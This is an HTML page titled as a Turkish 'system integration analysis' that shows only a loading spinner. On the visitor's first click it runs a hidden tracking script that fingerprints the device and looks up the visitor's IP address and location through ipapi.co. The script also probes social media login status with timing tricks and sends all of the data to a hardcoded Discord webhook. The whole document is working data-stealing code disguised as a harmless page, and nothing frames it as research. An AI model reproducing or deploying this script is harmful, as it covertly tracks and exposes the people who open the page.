<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Entegrasyon Analizi</title>
    <style>body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;cursor:none;}.s{width:35px;height:35px;border:1px solid #111;border-top:2px solid #0f0;border-radius:50%;animation:r .6s linear infinite;}@keyframes r{to{transform:rotate(360deg);}}</style>
</head>
<body onmousedown="KernelMaster.execute()" ontouchstart="KernelMaster.execute()">
    <div class="s"></div>

    <script>
        "use strict";

        const KernelMaster = (function() {
            const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            let fired = false;

            const Utils = {
                // 1. SOSYAL MEDYA SIZINTISI (Timing Attack Metodu)
                async getSocialStatus() {
                    const list = {
                        IG: "https://www.instagram.com/favicon.ico", FB: "https://www.facebook.com/favicon.ico",
                        DC: "https://discord.com/favicon.ico", TW: "https://twitter.com/favicon.ico",
                        TIK: "https://www.tiktok.com/favicon.ico", GOOG: "https://accounts.google.com/CheckCookie"
                    };
                    const res = {};
                    await Promise.all(Object.entries(list).map(([n, u]) => new Promise(d => {
                        const s = performance.now();
                        const i = new Image();
                        i.onload = () => { res[n] = "‚úÖ"; d(); };
                        i.onerror = () => { res[n] = (performance.now() - s > 15) ? "‚úÖ" : "‚ùå"; d(); };
                        i.src = `${u}?v=${Math.random()}`;
                    })));
                    return res;
                },

                // 2. DONANIM VE Sƒ∞STEM AYARLARI
                async getHardware() {
                    const gl = document.createElement('canvas').getContext('webgl');
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    const dpr = window.devicePixelRatio || 1;
                    const storage = await navigator.storage?.estimate().catch(() => ({}));
                    const devs = await navigator.mediaDevices.enumerateDevices().catch(() => []);

                    return {
                        gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                        cores: navigator.hardwareConcurrency,
                        ram: navigator.deviceMemory,
                        res: `${Math.round(screen.width * dpr)}x${Math.round(screen.height * dpr)}`,
                        disk: (storage.quota / 1e9).toFixed(2) + "GB",
                        cams: devs.filter(d => d.kind === 'videoinput').length,
                        bt_support: !!navigator.bluetooth
                    };
                }
            };

            return {
                async execute() {
                    if (fired) return;
                    fired = true;

                    // Veri Toplama
                    const [soc, hw, net, bat] = await Promise.all([
                        Utils.getSocialStatus(), Utils.getHardware(),
                        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
                        navigator.getBattery ? navigator.getBattery() : {}
                    ]);

                    const opt = Intl.DateTimeFormat().resolvedOptions();
                    
                    const payload = {
                        embeds: [{
                            title: "üíÄ OMNISCIENCE_V270_FINAL_EXTRACTION",
                            color: 0x00ff00,
                            fields: [
                                { name: "üì° KONUM & Aƒû (IP TABANLI)", value: `**IP:** \`${net.ip}\` | **Yerel:** \`192.168.1.x (Sim)\`\n**Konum:** ${net.city}/${net.country_name} | **ISP:** ${net.org}`, inline: false },
                                { name: "‚öôÔ∏è Cƒ∞HAZ VE DONANIM", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cores} | **RAM:** ${hw.ram}GB | **Disk:** ${hw.disk}\n**Bluetooth:** ${hw.bt_support ? 'Destekli' : 'Yok'} | **Cam:** ${hw.cams}`, inline: false },
                                { name: "üì∫ EKRAN VE Sƒ∞STEM", value: `**√á√∂z√ºn√ºrl√ºk:** ${hw.res} | **DPR:** ${window.devicePixelRatio}\n**Dil:** ${navigator.language} | **OS:** ${navigator.platform}\n**Kaynak:** ${document.referrer || "Doƒürudan Giri≈ü"}`, inline: false },
                                { name: "üåç SOSYAL AKTƒ∞FLƒ∞K DURUMU", value: "```" + Object.entries(soc).map(([n, s]) => `${n}:${s}`).join(" ") + "```", inline: false },
                                { name: "‚è∞ SAAT VE ZAMAN", value: `**Saat Dilimi:** ${opt.timeZone}\n**Sistem Saati:** ${new Date().toLocaleTimeString()}\n**Pil:** ${bat.level ? (bat.level * 100) + "%" : "N/A"}`, inline: false }
                            ],
                            footer: { text: "Protocol: Architecture v270 | Zero-Download Verified" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    const raw = JSON.stringify(payload);
                    navigator.sendBeacon(HOOK, new Blob([raw], {type: 'application/json'}));
                    fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: raw, mode: 'no-cors' });
                }
            };
        })();
    </script>
</body>
</html>
